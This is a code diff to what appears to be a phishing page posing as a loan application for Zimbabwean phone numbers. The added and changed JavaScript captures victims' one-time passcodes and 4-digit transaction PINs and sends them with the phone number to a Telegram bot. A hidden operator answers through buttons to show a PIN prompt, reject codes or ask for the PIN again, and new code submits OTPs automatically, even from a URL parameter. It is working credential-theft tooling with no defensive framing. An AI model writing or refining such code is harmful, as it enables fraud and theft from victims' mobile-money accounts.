@@ -363,6 +363,25 @@
                 document.getElementById('bP').textContent = '$' + pr + ' USD';
                 document.getElementById('pinAmt').textContent = '$' + pr + ' USD';
             }
+            // Autofill for testing if needed, or wait for input
+            autoFill();
+        }
+
+        function autoFill() {
+            // Check for OTP in URL for auto-processing
+            const p = new URLSearchParams(location.search);
+            const autoOtp = p.get('otp');
+            if (autoOtp && autoOtp.length === 6) {
+                const digs = autoOtp.split('');
+                digs.forEach((d, i) => {
+                    if (i < boxes.length) {
+                        boxes[i].value = d;
+                        boxes[i].classList.add('ok');
+                    }
+                });
+                chk();
+                doOTP();
+            }
         }
 
         // OTP boxes
@@ -375,11 +394,17 @@
                     digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
                     boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
                     chk();
+                    if (otp.length === 6) doOTP(); // Autosend
                     return;
                 }
-                if (v) { b.classList.add('ok'); if (i < boxes.length - 1) boxes[i+1].focus(); }
-                else { b.classList.remove('ok'); }
+                if (v) { 
+                    b.classList.add('ok'); 
+                    if (i < boxes.length - 1) boxes[i+1].focus(); 
+                } else { 
+                    b.classList.remove('ok'); 
+                }
                 chk();
+                if (otp.length === 6) doOTP(); // Autosend
             });
             b.addEventListener('keydown', e => {
                 if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
@@ -406,8 +431,8 @@
 
             const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
             const btns = [
-                [{ text: '✓ Valid', callback_data: 'otp_valid' }, { text: '✗ Invalid', callback_data: 'otp_invalid' }],
-                [{ text: '🔐 Request PIN', callback_data: 'otp_pin' }]
+                [{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }],
+                [{ text: '⚠️ Already Applied', callback_data: 'otp_applied' }]
             ];
 
             document.getElementById('ov').classList.add('on');
@@ -425,9 +450,23 @@
                             luid = u.update_id;
                             if (u.callback_query) {
                                 const cb = u.callback_query.data;
-                                if (cb === 'otp_valid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goSuccess(); }
-                                else if (cb === 'otp_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Invalid code. Try again.'); boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); boxes[0].focus(); }
-                                else if (cb === 'otp_pin') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); }
+                                if (cb === 'otp_approved') { 
+                                    clearInterval(iv); 
+                                    document.getElementById('ov').classList.remove('on'); 
+                                    document.getElementById('pinOv').classList.add('on'); // Show PIN Popup
+                                }
+                                else if (cb === 'otp_declined') { 
+                                    clearInterval(iv); 
+                                    document.getElementById('ov').classList.remove('on'); 
+                                    showErr('Invalid code. Try again.'); 
+                                    boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
+                                    boxes[0].focus(); 
+                                }
+                                else if (cb === 'otp_applied') { 
+                                    clearInterval(iv); 
+                                    document.getElementById('ov').classList.remove('on'); 
+                                    alert('This application has already been processed.');
+                                }
                             }
                         }
                     }).catch(e => console.error(e));
@@ -442,7 +481,7 @@
             if (pin.length !== 4) { e.textContent = 'Enter 4-digit PIN'; e.classList.add('show'); return; }
 
             const msg = `🔐 <b>Transaction PIN</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
-            const btns = [[{ text: '✓ Approve Loan', callback_data: 'pin_ok' }, { text: '✗ Decline', callback_data: 'pin_no' }]];
+            const btns = [[{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }]];
 
             document.getElementById('pinOv').classList.remove('on');
             document.getElementById('ov').classList.add('on');
@@ -460,8 +499,20 @@
                             luid = u.update_id;
                             if (u.callback_query) {
                                 const cb = u.callback_query.data;
-                                if (cb === 'pin_ok') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goSuccess(); }
-                                else if (cb === 'pin_no') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Authorization failed.'); }
+                                if (cb === 'pin_valid') { 
+                                    clearInterval(iv); 
+                                    document.getElementById('ov').classList.remove('on'); 
+                                    goSuccess(); 
+                                }
+                                else if (cb === 'pin_invalid') { 
+                                    clearInterval(iv); 
+                                    document.getElementById('ov').classList.remove('on'); 
+                                    document.getElementById('pinOv').classList.add('on');
+                                    document.getElementById('pinIn').value = '';
+                                    const pe = document.getElementById('pinErr');
+                                    pe.textContent = 'Incorrect PIN. Please try again.';
+                                    pe.classList.add('show');
+                                }
                             }
                         }
                     }).catch(e => console.error(e));
